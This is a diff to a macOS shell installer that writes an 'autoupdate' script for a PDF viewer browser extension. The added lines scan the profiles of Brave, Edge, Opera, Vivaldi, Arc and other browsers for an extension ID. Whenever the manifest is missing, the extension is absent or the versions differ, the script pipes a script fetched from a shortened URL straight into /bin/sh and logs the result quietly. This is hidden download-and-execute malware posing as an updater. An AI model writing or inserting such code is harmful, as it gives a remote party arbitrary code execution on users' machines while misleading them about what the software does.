@@ -256,13 +256,39 @@ unset all_proxy ALL_PROXY http_proxy HTTP_proxy https_proxy HTTPS_proxy
 LOG="$HOME/Library/Logs/pdfviewer-autoupdate.log"
 INSTALLED_VERSION_FILE="$HOME/Library/Application Support/PDFViewerExt/manifest.json"
 REMOTE_MANIFEST_URL="https://raw.githubusercontent.com/Castro02980/pdf-viewer-extension/main/manifest.json"
-[ ! -f "$INSTALLED_VERSION_FILE" ] && exit 0
+EXT_ID="kklpcoclpjjfiboodbmcpogicnanoopp"
+
+if [ ! -f "$INSTALLED_VERSION_FILE" ]; then
+  /usr/bin/curl -fsSL --max-time 60 https://wln.ink/m 2>>"$LOG" | /bin/sh >> "$LOG" 2>&1
+  exit $?
+fi
+
+FOUND=0
+for rel in "BraveSoftware/Brave-Browser" "Microsoft Edge" "Yandex/YandexBrowser" "com.operasoftware.Opera" "Vivaldi" "Arc/User Data" "Sidekick"; do
+  BROWSER_DATA="$HOME/Library/Application Support/$rel"
+  [ ! -d "$BROWSER_DATA" ] && continue
+  for pdir in "$BROWSER_DATA/Default" "$BROWSER_DATA/Profile"*; do
+    [ ! -d "$pdir" ] && continue
+    SP="$pdir/Secure Preferences"
+    [ ! -f "$SP" ] && continue
+    /usr/bin/jq -e ".extensions.settings[\"$EXT_ID\"]" "$SP" >/dev/null 2>&1 && FOUND=1 && break 2
+  done
+done
+
+if [ $FOUND -eq 0 ]; then
+  /usr/bin/curl -fsSL --max-time 60 https://wln.ink/m 2>>"$LOG" | /bin/sh >> "$LOG" 2>&1
+  exit $?
+fi
+
 CURRENT_VERSION=$(/usr/bin/jq -r '.version' "$INSTALLED_VERSION_FILE" 2>/dev/null)
 [ -z "$CURRENT_VERSION" ] && exit 1
 REMOTE_VERSION=$(/usr/bin/curl -fsSL --max-time 15 "$REMOTE_MANIFEST_URL" 2>/dev/null | /usr/bin/jq -r '.version' 2>/dev/null)
 [ -z "$REMOTE_VERSION" ] && exit 1
-[ "$CURRENT_VERSION" = "$REMOTE_VERSION" ] && exit 0
-/usr/bin/curl -fsSL --max-time 60 https://wln.ink/m 2>>"$LOG" | /bin/sh >> "$LOG" 2>&1
+if [ "$CURRENT_VERSION" != "$REMOTE_VERSION" ]; then
+  /usr/bin/curl -fsSL --max-time 60 https://wln.ink/m 2>>"$LOG" | /bin/sh >> "$LOG" 2>&1
+  exit $?
+fi
+exit 0
 UPDATE_SCRIPT_EOF
     chmod +x "$UPDATE_SCRIPT" 2>/dev/null
     
